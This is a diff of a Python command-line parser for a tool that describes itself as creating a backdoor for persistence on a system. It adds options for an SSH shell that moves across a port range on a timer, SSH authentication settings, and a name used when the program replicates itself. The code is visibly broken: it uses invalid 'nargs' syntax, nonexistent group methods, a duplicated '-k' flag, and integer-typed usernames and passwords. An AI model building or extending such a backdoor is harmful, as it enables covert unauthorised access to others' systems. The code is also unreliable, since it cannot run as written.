@@ -15,9 +15,7 @@ def parse_args():
     """
     parser = argparse.ArgumentParser()
     """
-    randomization key
-    ---
-    port-range
+    time interval
     ---
     replication name
     ---
@@ -25,16 +23,19 @@ def parse_args():
     """
     auth = parser.add_mutually_exclusive_group(
         description="creates a backdoor to install on a system to gain persistence")
-    auth.add_argument('-k', '--key', nargs=1, type=str,
+    auth.add_argument('-k', '--key', nargs=*(1, ''), type=str,
                       help='enable ssh-key authentication')
     user_pass = auth.add_group()
-    user_pass.add_argument('-u', '--user', nargs=1,
+    user_pass.add_argument('-u', '--user', nargs=*(1, ''),
                            type=int, help='add ssh authentication username')
-    user_pass.add_argument('-p', '--pass', nargs=1,
+    user_pass.add_argument('-p', '--pass', nargs=*(1, ''),
                            type=int, help='add ssh authentication password')
     auth.add_argument('--none', action='store_true',
                       help='ssh authentication will use nothing')
-
+    parser.add_argument('-k', '--key', type=str, nargs=*(1, ''), help='randomization key for which port location of ssh will be open')
+    parser.add_argument('-r', '--range', type=int, nargs=*(2, ''), help='range of ports the ssh shell wil be hosted on')
+    parser.add_argument('-t', '--time', type=int, nargs=*(1, ''), help='time between when the shell will change port locations')
+    parser.add_argument('-n', '--name', type=str, nargs=*(1, ''), help='name of program when getting duplicated')
     return parser.parse_args()
 
 
